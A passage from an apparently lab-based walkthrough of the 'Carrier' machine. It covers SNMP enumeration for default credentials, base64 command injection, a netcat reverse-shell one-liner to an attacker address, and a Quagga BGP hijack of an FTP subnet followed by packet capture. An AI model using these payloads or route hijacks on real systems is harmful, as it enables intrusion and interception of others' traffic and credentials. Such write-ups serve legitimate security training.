+At <a href="http://10.10.10.105/doc">http://10.10.10.105/doc</a> we see a listing of a few
+PDF files.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_doc.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Documents</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>The file &ldquo;diagram_for_tac.png&rdquo; contains an image of a network topology with
+three <a href="https://en.wikipedia.org/wiki/Autonomous_system_(Internet)">autonomous systems</a>
+and their numbers. Lyghtspeed networks seems to be AS 100 and connected to two
+other networks, AS 200 and AS 300.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_topology.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Network Topology</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>The other document called &ldquo;error_codes.pdf&rdquo; contains explanations for different
+error codes, including those we saw on the login page. The interesting one is
+45009, which states that the admin still uses default credentials which are
+set to a &ldquo;chassis serial number&rdquo;. Sounds like a good username to try could be
+&ldquo;admin&rdquo;, but the password still is a mystery as we do not know this number.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_pdf_error_codes.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>PDF document with error codes</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<h1 id="snmp-enumeration">SNMP enumeration</h1>
+
+<p>Instead of guessing serial numbers look at SNMP. Since my masscan
+scan did not show SNMP initially, I&rsquo;ve wasted way too much time on
+brute-forcing. Don&rsquo;t make the same mistake.</p>
+
+<p>From the nmap scan we know it is SNMP version 1, so we can use <a href="https://linux.die.net/man/1/snmpwalk">snmapwalk</a>
+to enumerate like so:</p>
+
+<pre><code> $ snmpwalk -c public 10.10.10.105 -v 1
+Created directory: /var/lib/snmp/mib_indexes
+SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: &quot;SN#NET_45JDX23&quot;
+End of MIB
+</code></pre>
+
+<p>Devices usually return myriads of data points but here we get just one. &ldquo;SN#&rdquo;
+sounds a lot like a serial number and indeed, trying &ldquo;admin&rdquo; and &ldquo;NET_45JDX23&rdquo;
+to log in works.</p>
+
+<h1 id="inside-the-admin-area">Inside the admin area</h1>
+
+<p>After login we can see links to four pages. The dashboard and monitoring pages are
+not very interesting, but tickets and diagnostics are worth a look.</p>
+
+<h2 id="tickets">Tickets</h2>
+
+<p>The first interesting page is located at the &ldquo;Tickets&rdquo; tab and displays a list of
+support tickets Lyghtspeed Networks handled. Most are fun to read but to one of
+them you should pay closer attention. It seems that a customer had problems
+reaching and FTP server in the <code>10.120.15.10/24</code> network but now things are back
+to normal. This FTP server will have an important role later on.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_tickets.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Support Tickets</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<h2 id="diagnostics">Diagnostics</h2>
+
+<p>The diagnostics page warns about an invalid license and has a single button
+&ldquo;Verify Status&rdquo;. Click it and the output you see is a list of three processes
+related to a tool called &ldquo;quagga&rdquo;, which seems to be running on this machine
+(or one that it is connected to).</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_diagnostics.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Quagga Diagnostics Page</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p><a href="https://en.wikipedia.org/wiki/Quagga_(software)">Quagga</a> is open source
+routing software. It is a free alternative to proprietary software from large
+vendors like Cisco or Juniper but presumably not used large scale too much
+(see this <a href="https://dzone.com/articles/quagga-success-and-yet-failure">interview</a>).
+Still it&rsquo;s good for a lab environment like this so this is probably the routing
+software used by Lyghtspeed Networks to operate it&rsquo;s AS.</p>
+
+<p>The output of the monitoring command shows that the tool runs. It looks very
+similar to the what a terminal would print if you run the <a href="http://linuxcommand.org/lc3_man_pages/ps1.html">ps</a>
+tool to check it. This screen screams command injection.</p>
+
+<p>Inspecting the request in <a href="https://portswigger.net/burp">burp</a> there is a
+strange POST parameter &ldquo;check=cXVhZ2dh&rdquo; sent along with the request. This not
+only looks like but actually is base64 and decodes to &ldquo;quagga&rdquo;.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_diag_burp_normal.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Burp, default request</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>Chances are the tool may just concatenate the strings &ldquo;ps | grep &rdquo; and &ldquo;quagga&rdquo;
+and return the result, so let&rsquo;s try to terminate this command and execute our
+own. Run <code>echo &quot;;id&quot; | base64</code> to encode the string &ldquo;;id&rdquo; to &ldquo;O2lkCg==&rdquo; and use
+that one in place of the original value of &ldquo;check&rdquo;. The output is as displayed
+below and proves we executed the <a href="http://man7.org/linux/man-pages/man1/id.1.html">id</a>
+command. It even proves that we are root. Sounds like jackpot.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_diag_burp_injected.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Burp, command injected</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>Getting a reverse shell is easy now. Encode a suitable payload:</p>
+
+<pre><code> $ echo &quot;;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.122 7001 &gt;/tmp/x&quot; | base64 -w 0
+O3JtIC90bXAveDtta2ZpZm8gL3RtcC94O2NhdCAvdG1wL3h8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzMCA3MDAxID4vdG1wL3gK
+</code></pre>
+
+<p>Now start a listener and use the payload in a new request. You should catch a
+shell:</p>
+
+<pre><code> $ nc -lnvp 7001
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::7001
+Ncat: Listening on 0.0.0.0:7001
+Ncat: Connection from 10.10.10.105.
+Ncat: Connection from 10.10.10.105:51372.
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# find / -name user.txt 2&gt;/dev/null
+/root/user.txt
+# cat /root/user.txt
+&lt;user-flag-here&gt;
+# find / -name root.txt 2&gt;/dev/null
+#
+</code></pre>
+
+<p>Surprisingly, we find the user flag in root&rsquo;s home folder. The root flag though
+is nowhere on this box. Sounds like we will spend more time here, so
+upgrade the shell to a fully interactive TTY (as explained e.g.,
+<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">here</a>).
+Note that there is no <code>python</code> installed but <code>python3</code> can be used.</p>
+
+<h1 id="shell-on-the-box">Shell on the box</h1>
+
+<h2 id="finding-quagga">Finding Quagga</h2>
+
+<p>An easy thing to notice is that a restore script runs every 10 minutes:</p>
+
+<pre><code>root@r1:~# cat /var/spool/cron/crontabs/root
+# DO NOT EDIT THIS FILE - edit the master and reinstall.
+# (/tmp/crontab.m6zD7R/crontab installed on Mon Jul  2 16:40:23 2018)
+...
+*/10 * * * * /opt/restore.sh
+</code></pre>
+
+<p>This script stops quagga, restores the configuration, and brings the service
+back up:</p>
+
+<pre><code>root@r1:~# cat /opt/restore.sh
+#!/bin/sh
+systemctl stop quagga
+killall vtysh
+cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
+cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
+systemctl start quagga
+</code></pre>
+
+<p>So what exactly is the configuration. For example, the BGP configuration file
+looks like this:</p>
+
+<pre><code>root@r1:~# cat /etc/quagga/bgpd.conf.orig
+!
+! Zebra configuration saved from vty
+!   2018/07/02 02:14:27
+!
+route-map to-as200 permit 10
+route-map to-as300 permit 10
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+line vty
+!
+</code></pre>
+
+<p>As expected, this configures the BGP daemon such that it acts as an autonomous
+system AS 100, connected to two neighbors AS 200 and AS 300</p>
+
+<h2 id="exploring-quagga">Exploring Quagga</h2>
+
+<p>Quagga is a combination of multiple programs. It&rsquo;s main purpose is to run daemons
+for the different routing protocols it supports and to allow these daemons to
+maintain the Linux Kernel routing table in accordance with the protocols.
+Instead of interacting with the Kernel directly, all protocol daemons use &ldquo;zebra&rdquo;,
+Quaggas routing manager, to change routing. See the <a href="https://www.quagga.net/docs/docs-multi/System-Architecture.html#System-Architecture">docs</a>
+for an overview.</p>
+
+<p>Quagga supports routing protocols like the Routing Information Protocol (RIP)
+(<a href="https://www.quagga.net/docs/docs-multi/RIP.html#RIP">RIP-docs</a>), Open Shortest
+Path First (OSPF) (<a href="https://www.quagga.net/docs/docs-multi/OSPFv3.html#OSPFv3">OSPF-docs</a>)
+and also the Border Gateway Protocol (BGP) (<a href="https://www.quagga.net/docs/docs-multi/BGP.html#BGP">BGP-docs</a>).
+Zebra as well as each of these routers all have separate configuration files.
+On this box, we find files only for Zebra and BGP, suggesting that it is used
+as a BGP router.</p>
+
+<p>Quagga daemons can not only be configured via files but also interactively. For
+that, they each have a separate Telnet-based interface you can usually only
+connect to locally. To easy configuration, a tool called <code>vtysh</code> can be used to
+avoid jumping between sessions. See <a href="https://openmaniak.com/quagga_tutorial.php#vtysh">here</a>
+for a short intro. With a shell on the box, we can just use &ldquo;vtysh&rdquo; without
+being asked for a password:</p>
+
+<pre><code>root@r1:~# vtysh
+
+Hello, this is Quagga (version 0.99.24.1).
+Copyright 1996-2005 Kunihiro Ishiguro, et al.
+</code></pre>
+
+<p>By printing the neighbors we can verify our assumptions about the topology of
+the autonomous systems. Indeed we seem to be AS 100 and connected to AS 200 and
+300:</p>
+
+<pre><code>r1# show bgp neigh
+BGP neighbor is 10.78.10.2, remote AS 200, local AS 100, external link
+  BGP version 4, remote router ID 10.255.255.2
+  BGP state = Established, up for 00:02:40
+...
+BGP neighbor is 10.78.11.2, remote AS 300, local AS 100, external link
+  BGP version 4, remote router ID 10.255.255.3
+  BGP state = Established, up for 00:02:38
+...
+</code></pre>
+
+<p>Furthermore, printing the routes shows which networks can be reached via each
+of the neighbors and the corresponding local interfaces:</p>
+
+<pre><code>r1# show ip route
+Codes: K - kernel route, C - connected, S - static, R - RIP,
+       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel,
+       &gt; - selected route, * - FIB route
+
+K&gt;* 0.0.0.0/0 via 10.99.64.1, eth0
+C&gt;* 10.78.10.0/24 is directly connected, eth1
+C&gt;* 10.78.11.0/24 is directly connected, eth2
+C&gt;* 10.99.64.0/24 is directly connected, eth0
+B&gt;* 10.100.10.0/24 [20/0] via 10.78.10.2, eth1, 00:00:58
+B&gt;* 10.100.11.0/24 [20/0] via 10.78.10.2, eth1, 00:00:58
+...
+B&gt;* 10.120.15.0/24 [20/0] via 10.78.11.2, eth2, 00:01:01
+...
+C&gt;* 127.0.0.0/8 is directly connected, lo
+</code></pre>
+
+<p>Looks like there is a BGP route to the network 10.120.15.0/24, which is the
+network in which the mysterious FTP server should be.</p>
+
+<h2 id="bgp-hijacking">BGP hijacking</h2>
+
+<p>The box runs a BGP daemon, we found pictures of the network topology, and the
+support tickets are about routing configurations. We found a script to restore
+the configuration every 10 minutes. In order words, this box must be about BGP
+hijacking. I&rsquo;ll start with some BGP background and move on to how it&rsquo;s done on
+this box. In the end, we will hijack a route and man-in-the-middle an FTP
+connection.</p>
+
+<h3 id="background-on-bgp">Background on BGP</h3>
+
+<p>Routing on the Internet is a little more complex than on your private LAN.
+Many independent companies run big networks of routers, called autonomous
+systems (AS). Each one is connected to several others. Routing protocols can be
+subdivided broadly into Interior Gateway Protocols (IGP), which are used within
+an AS, and Exterior Gateway Protocols (EGP) used for routing across AS
+boundaries. For IGP, the goal is usually to find the shortest path from source
+to destination to optimize resource consumption. <a href="https://tools.ietf.org/html/rfc2328">OSPF</a>
+is a popular example. <a href="https://tools.ietf.org/html/rfc4271">BGP</a> is pretty much
+the only EGP in use and must allow for more complex routing. An AS is usually
+in some sort of business relationships with an AS it is connected to and wants
+to implement routing policies that reflect the nature of this relationship.
+This is what the Quagga BGP routing daemon allows to configure.</p>
+
+<p>In BGP, each AS is identified by a number. For this box, we have 3 AS with
+numbers 100, 200 and 300. Each AS seems to have only a single router and we
+have the one of AS 100 under control. Usually, each AS would have many routers.
+The current configuration looks like so:</p>
+
+<pre><code>r1# sh run
+Building configuration...
+
+Current configuration:
+!
+!
+interface eth0
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth1
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth2
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface lo
+ no link-detect
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+route-map to-as200 permit 10
+!
+route-map to-as300 permit 10
+!
+ip forwarding
+!
+line vty
+!
+</code></pre>
+
+<p>The way I understand this configuration is as follows. We have 3 network
+interfaces, each with IPv6 routing advertisements disabled, and one loopback
+interface. The BGP router section defines us as AS 100, sets an ID for the
+router and adds two advertisements for the networks <code>10.101.8.0/21</code> and
+<code>10.101.16.0/21</code>. <code>redistribute connected</code> adds all locally connected subnets
+to the advertisements. Then, two neighbors at <code>10.78.10.2</code> (AS 200) and
+<code>10.78.11.2</code> (AS 300) are defined. For each one a route map is defined that
+tags all potentially advertised routes. Subsequently, these routes are
+permitted, meaning they are actually advertised (e.g., with <code>route-map to-as200 permit 10</code>).
+Finally, <code>ip forwarding</code> probably indicates that IP forwarding is enabled.</p>
+
+<p>Provided that the connection to the neighboring routers works, they will now
+exchange route advertisements like those defined above. An advertisement is an
+IP range (prefix) combined with a list of AS numbers (the path). For instance, the
+advertisements our router sends to AS 200 are these:</p>
+
+<pre><code>r1# show ip bgp neighbors 10.78.10.2 advertised-routes
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*&gt; 10.78.10.0/24    10.78.10.1               0         32768 ?
+*&gt; 10.78.11.0/24    10.78.10.1               0         32768 ?
+*&gt; 10.99.64.0/24    10.78.10.1               0         32768 ?
+*&gt; 10.101.8.0/21    10.78.10.1               0         32768 i
+*&gt; 10.101.16.0/21   10.78.10.1               0         32768 i
+*&gt; 10.120.10.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.11.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.12.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.13.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.14.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.15.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.16.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.17.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.18.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.19.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.20.0/24   10.78.10.1                             0 300 i
+
+Total number of prefixes 18
+</code></pre>
+
+<p>This list contains the two prefixes <code>10.101.8.0/21</code> and <code>10.101.16.0/21</code> we saw
+up in the config. Their path is &ldquo;i&rdquo;, which probably is supposed to mean direct
+connection. Three more prefixes <code>10.78.10.0/24</code>, <code>10.78.11.0/24</code> and
+<code>10.99.64.0/24</code> also have no number in their path. They are the three connected
+subnets and the configuration says to advertise these. All the other routes are
+for prefixes we have nothing to do with. For example, we advertise a route to
+the interesting prefix <code>10.120.15.0/24</code> with &ldquo;300&rdquo; in the path. This is because
+we received an advertisement from AS 300 for this prefix and now advertise this
+to 200.</p>
+
+<p>AS 200 will receive this advertisement and could use it to route packets via
+our router. However, it will also receive the advertisement directly from AS
+300 (assuming they actually have a connection). Given these two advertisements,
+it will usually pick the one with the shortest path. In this case, it will
+discard ours and send packets directly to AS 300 (The actual decision process
+is a little more involved. See <a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/13753-25.html">here</a>
+for a sample path selection process in Cisco routers).</p>
+
+<p>Note that the Quagga BGP daemon will pick routes and then instruct the Zebra
+daemon to install them into the Linux Kernel. In there, Linux will pick from
+all routes in the table the one that is most specific (<a href="http://linux-ip.net/html/routing-selection.html">longest prefix match</a>).
+For example, if a packet with destination <code>10.120.15.10</code> must be forwarded
+and two routes <code>10.120.15.0/24</code> and <code>10.120.15.0/25</code> exist, Linux picks the
+latter. This process is not governed by BGP anymore.</p>
+
+<p>This is one way how BGP hijacking can be performed. If an AS advertises a route
+to <code>10.120.15.0/24</code> we go and advertise two more specific routes <code>10.120.15.0/25</code>
+and <code>10.120.15.128/25</code>. Any BGP router accepting these two routes will then
+send traffic to us instead of the original AS. Filtering rules may be in place
+(e.g., for too specific prefixes, as recommended by the French Cybersecurity
+Agency <a href="https://www.ssi.gouv.fr/uploads/2016/03/bgp-configuration-best-practices.pdf">here</a>)
+and stop us but let&rsquo;s just hope for the best and try it.</p>
+
+<h3 id="performing-the-attack">Performing the attack</h3>
+
+<p>Now the fun part. We assume the client will be in AS 200 and connects to the
+FTP server in AS 300, subnet <code>10.120.15.0/24</code>. As described above, we subdivide
+it into two more specific prefixes and advertise both of them to AS 200. The
+effect will be that traffic flows through our router.</p>
+
+<p>Two things must be kept in mind for this to work. First, we must not advertise
+these routes to AS 300. If it puts them into the routing table they will
+override the existing route to that subnet. Instead of delivering packets to
+the server it will send them to us. Second, we must not only prevent us
+advertising these routes but also keep AS 200 from forwarding them to AS 300
+(this would have the same effect as a direct advertisement).</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_advertisements.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Advertisements for BGP hijacking</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>The figure above is a sketch of the plan. We advertise 2 specific prefixes to
+AS 200, which will prefer them over the more general one it gets from AS 300.
+AS 200 will thus forward packets from the client to us. Since we still get the
+advertisement from AS 300 we will forward them there, from where they will be
+delivered to the FTP server. Return packets should usually go their normal
+route (but we will see it is not the case for this box since the router itself
+is the client). The configuration for the new advertisements is installed with
+&ldquo;vtysh&rdquo;:</p>
+
+<pre><code>r1# configure terminal
+r1(config)# ip prefix-list hijack permit 10.120.15.0/25
+r1(config)# ip prefix-list hijack permit 10.120.15.128/25
+r1(config)# route-map to-as200 permit 10
+r1(config-route-map)# match ip address prefix-list hijack
+r1(config-route-map)# set community no-export
+r1(config-route-map)# route-map to-as200 permit 20
+r1(config-route-map)# route-map to-as300 deny 10
+r1(config-route-map)# match ip address prefix-list hijack
+r1(config-route-map)# route-map to-as300 permit 20
+r1(config-route-map)# router bgp 100
+r1(config-router)# network 10.120.15.0/25
+r1(config-router)# network 10.120.15.128/25
+r1(config-router)# end
+</code></pre>
+
+<p>To better understand this new configuration, print it out again to see it
+properly ordered and indented:</p>
+
+<pre><code>r1# sh run
+Building configuration...
+
+Current configuration:
+!
+!
+interface eth0
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth1
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth2
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface lo
+ no link-detect
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ network 10.120.15.0/25
+ network 10.120.15.128/25
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+ip prefix-list hijack seq 5 permit 10.120.15.0/25
+ip prefix-list hijack seq 10 permit 10.120.15.128/25
+!
+route-map to-as200 permit 10
+ match ip address prefix-list hijack
+ set community no-export
+!
+route-map to-as200 permit 20
+!
+route-map to-as300 deny 10
+ match ip address prefix-list hijack
+!
+route-map to-as300 permit 20
+!
+ip forwarding
+!
+line vty
+!
+end
+</code></pre>
+
+<p>The upper part is the same. The first difference is the additional two networks
+in the router section. The lower part is crucial to make things work.
+We define a prefix list called &ldquo;hijack&rdquo; with the two specific prefixes inside.
+These rules are processed top to bottom similar to netfilter rules. &ldquo;permit&rdquo; means the prefix
+belongs to the list. A &ldquo;deny&rdquo; would exclude it. More details on that <a href="http://packetlife.net/blog/2010/feb/1/understanding-ip-prefix-lists/">here</a>.</p>
+
+<p>The route map sections behave similarly as well. For &ldquo;to-as200&rdquo;, the first
+section (&ldquo;10&rdquo;) applies only if an advertisement matches the prefix list &ldquo;hijack&rdquo;
+and sets the community &ldquo;no-export&rdquo;. Communities are a way for one AS to
+influence how another AS processes an advertisement. Get an overview <a href="https://networklessons.com/bgp/bgp-communities-explained">here</a>.
+&ldquo;no-export&rdquo; instructs AS 200 to not advertise the prefix to any other AS. This
+is exactly what we want for our two hijack prefixes. All other advertisements
+do not match the prefix list and are handled by the second section (&ldquo;20&rdquo;),
+which just permits the advertisement unchanged.</p>
+
+<p>For route map &ldquo;to-as300&rdquo; we match first on the prefix list and deny in this
+case. Only advertisements not matching &ldquo;hijack&rdquo; are permitted. This effectively
+filters the advertisements to AS 300.</p>
+
+<p>We can verify that with &ldquo;vtysh&rdquo;. Check the routes advertised to AS 200 like
+this:</p>
+
+<pre><code>r1# show ip bgp neighbors 10.78.10.2 advertised-routes
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*&gt; 10.78.10.0/24    10.78.10.1               0         32768 ?
+*&gt; 10.78.11.0/24    10.78.10.1               0         32768 ?
+*&gt; 10.99.64.0/24    10.78.10.1               0         32768 ?
+*&gt; 10.101.8.0/21    10.78.10.1               0         32768 i
+*&gt; 10.101.16.0/21   10.78.10.1               0         32768 i
+*&gt; 10.120.10.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.11.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.12.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.13.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.14.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.15.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.15.0/25   10.78.10.1               0         32768 i
+*&gt; 10.120.15.128/25 10.78.10.1               0         32768 i
+*&gt; 10.120.16.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.17.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.18.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.19.0/24   10.78.10.1                             0 300 i
+*&gt; 10.120.20.0/24   10.78.10.1                             0 300 i
+
+Total number of prefixes 18
+</code></pre>
+
+<p>You see that it contains the two prefixes as expected. Compare it with the
+advertisements to AS 300, which do not contain them:</p>
+
+<pre><code>r1# show ip bgp neighbors 10.78.11.2 advertised-routes
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
+              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete
+
+   Network          Next Hop            Metric LocPrf Weight Path
+*&gt; 10.78.10.0/24    10.78.11.1               0         32768 ?
+*&gt; 10.78.11.0/24    10.78.11.1               0         32768 ?
+*&gt; 10.99.64.0/24    10.78.11.1               0         32768 ?
+*&gt; 10.100.10.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.11.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.12.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.13.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.14.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.15.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.16.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.17.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.18.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.19.0/24   10.78.11.1                             0 200 i
+*&gt; 10.100.20.0/24   10.78.11.1                             0 200 i
+*&gt; 10.101.8.0/21    10.78.11.1               0         32768 i
+*&gt; 10.101.16.0/21   10.78.11.1               0         32768 i
+
+Total number of prefixes 16
+</code></pre>
+
+<p>Now we are all set and have to wait for the client to connect to the FTP
+server. I brought a static version of <a href="https://www.tcpdump.org/">tcpdump</a> onto
+the box and tuned in (there is one installed but it did not capture anything,
+no idea why&hellip;). Pick any of eth1 or eth2 but not both or you will see the
+packets twice:</p>
+
+<pre><code>root@r1:/dev/shm/.me# ./tcpdump -enni eth1 port 21
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
+13:58:01.240893 00:16:3e:5b:49:a9 &gt; 00:16:3e:8a:f2:4f, ethertype IPv4 (0x0800), length 74: 10.78.10.2.39156 &gt; 10.120.15.10.21: Flags [S], seq 238980382, win 2
+9200, options [mss 1460,sackOK,TS val 1352793799 ecr 0,nop,wscale 7], length 0
+13:58:01.241040 00:16:3e:8a:f2:4f &gt; 00:16:3e:5b:49:a9, ethertype IPv4 (0x0800), length 74: 10.120.15.10.21 &gt; 10.78.10.2.39156: Flags [S.], seq 2044658193, ack
+ 238980383, win 28960, options [mss 1460,sackOK,TS val 144101478 ecr 1352793799,nop,wscale 7], length 0
+13:58:01.241063 00:16:3e:5b:49:a9 &gt; 00:16:3e:8a:f2:4f, ethertype IPv4 (0x0800), length 66: 10.78.10.2.39156 &gt; 10.120.15.10.21: Flags [.], ack 1, win 229, opti
+ons [nop,nop,TS val 1352793799 ecr 144101478], length 0
+13:58:01.309136 00:16:3e:8a:f2:4f &gt; 00:16:3e:5b:49:a9, ethertype IPv4 (0x0800), length 86: 10.120.15.10.21 &gt; 10.78.10.2.39156: Flags [P.], seq 1:21, ack 1, wi
+n 227, options [nop,nop,TS val 144101546 ecr 1352793799], length 20: FTP: 220 (vsFTPd 3.0.3)
+13:58:01.309173 00:16:3e:5b:49:a9 &gt; 00:16:3e:8a:f2:4f, ethertype IPv4 (0x0800), length 66: 10.78.10.2.39156 &gt; 10.120.15.10.21: Flags [.], ack 21, win 229, opt
+ions [nop,nop,TS val 1352793867 ecr 144101546], length 0
+13:58:01.309347 00:16:3e:5b:49:a9 &gt; 00:16:3e:8a:f2:4f, ethertype IPv4 (0x0800), length 77: 10.78.10.2.39156 &gt; 10.120.15.10.21: Flags [P.], seq 1:12, ack 21, w
+in 229, options [nop,nop,TS val 1352793867 ecr 144101546], length 11: FTP: USER root
